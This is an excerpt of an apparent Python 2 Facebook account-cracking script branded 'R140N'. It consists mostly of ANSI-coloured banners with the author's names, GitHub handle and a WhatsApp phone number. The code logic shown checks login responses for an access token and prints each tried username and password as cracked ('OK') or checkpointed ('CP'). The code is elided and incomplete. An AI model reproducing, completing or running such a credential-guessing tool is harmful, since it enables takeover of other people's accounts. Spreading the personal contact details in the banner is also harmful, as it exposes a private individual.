...
\033[1;35m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
       ...
       \033[1;32mFACEBOOK \033[1;34mMD NANU MIAH 

       \033[1;33mAUTHOR \033[1;32mMOHAMMAD RIPON HASAN

       \033[1;34mGITHUB \033[1;35mR140N 

       \033[1;36mWHATSAPP \033[1;33m+8801822695844

\033[1;32m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇

""")

print("\033[0;91mThis Tool's By R140N")
...
def menu():
    ...
    print '\033[0;93mAUTHOR   : MOHAMMAD RIPON'

    print '\033[0;94mFACEBOOK : MD NANU MIAH '

    print '\033[0;96mGITHUB   : R140N'
...
def action():
    ...
    psb('[\xe2\x9c\x96] AB YAHA WAIT KARO ...')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[R140N-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;92m [R140N-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
